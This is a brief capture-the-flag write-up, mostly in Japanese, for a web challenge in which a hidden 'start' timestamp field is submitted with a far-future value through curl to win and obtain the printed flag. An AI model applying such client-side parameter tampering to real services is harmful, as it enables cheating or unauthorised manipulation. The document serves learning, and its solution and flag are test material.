# Celeste Speedrunning Association:web:20pts
I love Celeste Speedrunning so much!!! It's so funny to watch!!!  
[Here's my favorite site!](https://mount-tunnel.web.actf.co/)  

# Solution
リンクが渡される。  
```bash
$ curl https://mount-tunnel.web.actf.co/
Welcome to Celeste speedrun records!!!<br>
Current record holders (beat them at <current URL>/play for a flag!):<ol>
<li>Old Lady: 0 seconds</li>
<li>Madeline: 10 seconds</li>
<li>Badeline: 10.1 seconds</li></ol>
$ curl https://mount-tunnel.web.actf.co/play

<form action="/submit" method="POST">
  <input type="text" style="display: none;" value="1682300461.9167948" name="start" />
  <input type="submit" value="Press when done!" />
</form>
```
見てみると、`/play`にボタンがあり、開始時間として既に設定されたUNIXタイムな値が送信されるようだ。  
レコードホルダーに勝てばよいようなので、開始時間が未来となる大きな値をPOSTしてみる。  
```bash
$ curl -X POST https://mount-tunnel.web.actf.co/submit -d "start=9999999999"
you win the flag: actf{wait_until_farewell_speedrun}
```
flagが得られた。  

## actf{wait_until_farewell_speedrun}